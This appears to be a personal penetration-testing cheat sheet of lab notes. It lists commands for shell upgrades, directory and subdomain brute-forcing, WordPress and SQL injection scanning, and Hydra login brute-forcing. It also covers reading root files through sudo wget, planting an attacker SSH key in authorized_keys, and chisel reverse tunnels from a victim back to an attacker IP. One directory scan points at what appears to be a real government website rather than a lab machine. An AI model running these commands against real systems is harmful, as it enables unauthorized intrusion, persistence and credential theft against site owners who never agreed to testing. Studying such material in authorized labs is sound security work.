### upgrading shells

https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html

```
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

/bin/sh -i
```
https://www.nickczh.com/upgrading-your-shell/


### gobuster

gobuster dir --url https://10.129.240.189 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k

### subdomain enumeration gobuster
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain 

### gobuster status code
go buster status code : `gobuster dir -u https://www.jmicc.gov.pk/ -w /usr/share/wordlists/dirb/common.txt -b '403,404'`

using wget to reveal the text as /root/root

sudo wget --input-file /root/root.txt

https://gtfobins.github.io/


### wpscan

wpscan --url https://brainfuck.htb --disable-tls-checks

### for ciphers

https://rumkin.com/tools/cipher/ for ciphers

### sql injection

`sqlmap -r login.req`

sqlinjection try: `admin'-- -`

### Using Hydra

```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.162.247 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid"
```

```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.162.247 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect"

```

### hacktools extensions

Yuo can use the extension of hacktoools for generating reverse shells

### ansible privilege escalation

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/?ref=nickczh.com

### adding keys

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fQqdcN8qxqB3OH9lCBMyGcAz+c8a5uRxuvif1A98/jv5LLYy/2GO7r68nHOSIviFtkbnydmuTyzBBSWhbxC/MWAX8XZx5C3rF598/phDzwN4seus2SMhZi5zUZ6iylBBI8xht5J+u/InI6BlsXQ65H3xw+yFxndxeKi3Gu17glt3OEe8aAPaxj3qU89L1xbOr4m3mSqnhJne7eV05nqYvZDHP+pgOQE02dmmplRfTHCKbEfwqY/nDx7QWw6WtrQigNlEGNcWJUVKNlXBGoGHZuyHNMpoh4XjinLeM9GKFY4xRxk2CyFBLwlouOtj7s5EtFB5CLnaQMpDtzI+gJyma7nzxJZxELrlTHyjPJoQHQSmlQe+tBNBRAEL92wac79psK7s3PARdCcyEnpe8l9cplPP8YIS8tMg6BVVjTGPQNN0BJBwRxEjrvAKae1phztkQD7tZKy3aEl8VCUR8tpJ0fw0mK6/PJGxgCYXZWWKwycHOnJKQYDL17qsTypaLL8= kali@kali" >> authorized_keys

### Proxychains

proxychains evil-winrm -u matthew -p 147258269 -i 172.16.22.1

trying evil winrm on dc with prooxychains

https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29

sudo ./chisel server -p 8081 --reverse 
- on attacker

./chisel client 10.10.16.24:8081 R:socks
 - on victim

on attacker
sudo nano /etc/proxychains4.conf

`socks5   127.0.0.1   1080`

how to add attacker ot proxychains is what i need to look into

# using chisel through evilwinrm

./chisel client 10.10.16.24:8001 R:5985:172.16.22.1:5985
./chisel server -p 8001 — reverse

.\chisel.exe client 10.10.16.24:9095 R:80localhost:80 R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
./chisel server -p 9095 -reverse



